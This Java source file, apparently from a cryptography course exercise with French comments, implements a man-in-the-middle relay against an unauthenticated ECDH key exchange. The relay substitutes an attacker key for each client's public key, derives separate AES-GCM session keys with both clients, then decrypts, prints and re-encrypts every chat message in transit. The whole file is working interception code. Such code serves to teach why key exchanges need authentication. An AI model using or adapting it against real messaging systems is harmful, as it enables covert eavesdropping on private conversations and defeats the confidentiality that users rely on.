import java.security.*;
import java.security.spec.*;
import java.util.*;
import java.util.Base64;
import javax.crypto.*;
import javax.crypto.spec.*;

public class ServerInterceptor {

    // Clés éphémères de l'attaquant (une paire par client)
    private Map<Integer, KeyPair> attackerKeyPairs = new HashMap<>();
    // Vraies clés publiques des clients (interceptées)
    private Map<Integer, PublicKey> clientRealKeys = new HashMap<>();
    // Clés AES de session dérivées par l'attaquant (une par client)
    private Map<Integer, SecretKey> sessionKeys = new HashMap<>();
    private int keysReceived = 0;

    public ServerInterceptor() {
        System.out.println("[Server] MitM ECDH attack mode");
    }

    public String onMessageRelay(String message, int fromClient, int toClient) {
        if (keysReceived < 2) {
            return interceptHandshake(message, fromClient, toClient);
        } else {
            return interceptMessage(message, fromClient, toClient);
        }
    }

    // 3.4.2 - Phase handshake : substitue la clé publique ECDH de chaque client
    // par celle de l'attaquant, puis dérive les clés de session avec chacun
    private String interceptHandshake(String message, int fromClient, int toClient) {
        try {
            // Récupère la vraie clé publique du client
            PublicKey clientPubKey = KeyFactory.getInstance("EC")
                    .generatePublic(new X509EncodedKeySpec(Base64.getDecoder().decode(message)));
            clientRealKeys.put(fromClient, clientPubKey);

            // Génère une paire de clés éphémère pour cette session
            KeyPairGenerator kpg = KeyPairGenerator.getInstance("EC");
            kpg.initialize(new ECGenParameterSpec("secp256r1"));
            KeyPair attackerKP = kpg.generateKeyPair();
            attackerKeyPairs.put(fromClient, attackerKP);

            keysReceived++;

            // Dès que les deux clés sont reçues, dérive les clés AES avec chaque client.
            // Pour le session key avec clientId X, on utilise la paire envoyée À X,
            // c'est-à-dire attackerKeyPairs[otherClient] (celle interceptée depuis l'autre côté).
            if (keysReceived == 2) {
                for (int clientId : clientRealKeys.keySet()) {
                    int otherClientId = (clientId == 1) ? 2 : 1;
                    KeyAgreement ka = KeyAgreement.getInstance("ECDH");
                    ka.init(attackerKeyPairs.get(otherClientId).getPrivate());
                    ka.doPhase(clientRealKeys.get(clientId), true);
                    byte[] keyBytes = MessageDigest.getInstance("SHA-256").digest(ka.generateSecret());
                    sessionKeys.put(clientId, new SecretKeySpec(keyBytes, "AES"));
                }
                System.out.println("[MitM] ECDH interception complete. Session keys derived for both clients.");
            }

            // Renvoie la clé publique de l'attaquant à la place de la vraie
            return Base64.getEncoder().encodeToString(attackerKP.getPublic().getEncoded());

        } catch (Exception e) {
            System.out.println("[MitM] Handshake interception failed: " + e.getMessage());
            return message;
        }
    }

    // 3.4.2 - Phase chat : déchiffre le message avec la clé du client émetteur,
    // affiche le plaintext, puis réencrypte avec la clé du client destinataire
    private String interceptMessage(String message, int fromClient, int toClient) {
        try {
            byte[] data = Base64.getDecoder().decode(message);
            byte[] nonce = Arrays.copyOfRange(data, 0, 12);
            byte[] ciphertext = Arrays.copyOfRange(data, 12, data.length);

            // Déchiffrement avec la clé de session du client émetteur
            Cipher dec = Cipher.getInstance("AES/GCM/NoPadding");
            dec.init(Cipher.DECRYPT_MODE, sessionKeys.get(fromClient), new GCMParameterSpec(128, nonce));
            byte[] plaintext = dec.doFinal(ciphertext);
            System.out.println("[MitM] Client " + fromClient + " -> Client " + toClient
                    + " : " + new String(plaintext, "UTF-8"));

            // Réencryptage avec la clé de session du client destinataire
            byte[] newNonce = new byte[12];
            new SecureRandom().nextBytes(newNonce);
            Cipher enc = Cipher.getInstance("AES/GCM/NoPadding");
            enc.init(Cipher.ENCRYPT_MODE, sessionKeys.get(toClient), new GCMParameterSpec(128, newNonce));
            byte[] newCipher = enc.doFinal(plaintext);

            byte[] result = new byte[newNonce.length + newCipher.length];
            System.arraycopy(newNonce, 0, result, 0, newNonce.length);
            System.arraycopy(newCipher, 0, result, newNonce.length, newCipher.length);

            return Base64.getEncoder().encodeToString(result);

        } catch (Exception e) {
            System.out.println("[MitM] Message interception failed: " + e.getMessage());
            return message;
        }
    }
}
